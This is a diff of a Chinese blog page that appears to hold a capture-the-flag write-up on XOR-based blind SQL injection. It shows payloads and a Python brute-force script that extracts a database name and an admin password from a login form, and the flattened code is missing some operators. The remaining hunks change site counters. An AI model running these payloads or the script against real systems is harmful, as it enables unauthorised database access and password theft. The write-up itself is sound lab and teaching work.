@@ -552,7 +552,7 @@
 <p>然后猜password的值，暴力猜解，与猜资料库类似:</p>
 <p>admin’^(ascii(mid((select(password)from(admin))from(1)))&lt;&gt;97)^0#</p>
 <p>得到密码的MD5值:51b7a76d51e70b419f60d3473fb6f900，解密后登陆，得到flag </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests str_all=<span class="string">"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125; -*/="</span> url=<span class="string">"http://118.89.219.210:49167/index.php"</span> r=requests.session() <span class="function"><span class="keyword">def</span> <span class="title">databasere</span><span class="params">()</span>:</span> resutlt=<span class="string">""</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): fla = <span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> str_all: playlod=<span class="string">"admin'^(ascii(mid(database()from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(i),ord(j)) data = &#123; <span class="string">"username"</span>: playlod, <span class="string">"password"</span>: <span class="string">"123"</span> &#125; s=r.post(url,data) print(playlod) <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> s.text: resutlt =j print(resutlt) <span class="keyword">if</span> fla == <span class="number">0</span>: <span class="keyword">break</span> <span class="function"><span class="keyword">def</span> <span class="title">password</span><span class="params">()</span>:</span> resutlt=<span class="string">""</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>): fla=<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> str_all: playlod = <span class="string">"admin'^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(i <span class="number">1</span>),ord(j)) data = &#123; <span class="string">"username"</span>: playlod, <span class="string">"password"</span>: <span class="string">"123"</span> &#125; s=r.post(url,data) print(playlod) <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> s.text: resutlt =j fla=<span class="number">1</span> print(<span class="string">'**************************'</span>,resutlt) <span class="keyword">if</span> fla==<span class="number">0</span>: <span class="keyword">break</span> <span class="comment">#databasere() password()</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requests <span class="attribute">str_all</span>=<span class="string">"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125; -*/="</span> <span class="attribute">url</span>=<span class="string">"http://118.89.219.210:49167/index.php"</span> <span class="attribute">r</span>=requests.session() def databasere(): <span class="attribute">resutlt</span>=<span class="string">""</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(30): fla = 0 <span class="keyword">for</span> j <span class="keyword">in</span> str_all: <span class="attribute">playlod</span>=<span class="string">"admin'^(ascii(mid(database()from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(i),ord(j)) data = &#123; <span class="string">"username"</span>: playlod, <span class="string">"password"</span>: <span class="string">"123"</span> &#125; <span class="attribute">s</span>=r.post(url,data) <span class="builtin-name">print</span>(playlod) <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> s.text: resutlt =j <span class="builtin-name">print</span>(resutlt) <span class="keyword">if</span> fla == 0: break def password(): <span class="attribute">resutlt</span>=<span class="string">""</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(40): <span class="attribute">fla</span>=0 <span class="keyword">for</span> j <span class="keyword">in</span> str_all: playlod = <span class="string">"admin'^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(i 1),ord(j)) data = &#123; <span class="string">"username"</span>: playlod, <span class="string">"password"</span>: <span class="string">"123"</span> &#125; <span class="attribute">s</span>=r.post(url,data) <span class="builtin-name">print</span>(playlod) <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> s.text: resutlt =j <span class="attribute">fla</span>=1 <span class="builtin-name">print</span>(<span class="string">'**************************'</span>,resutlt) <span class="keyword">if</span> <span class="attribute">fla</span>==0: break #databasere() password()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -728,7 +728,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-count">66</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -750,7 +750,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">80</span>
+                  <span class="site-state-item-count">83</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -894,7 +894,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">42.9k</span>
+    <span title="Site words total count">43.4k</span>
   
 </div>
 
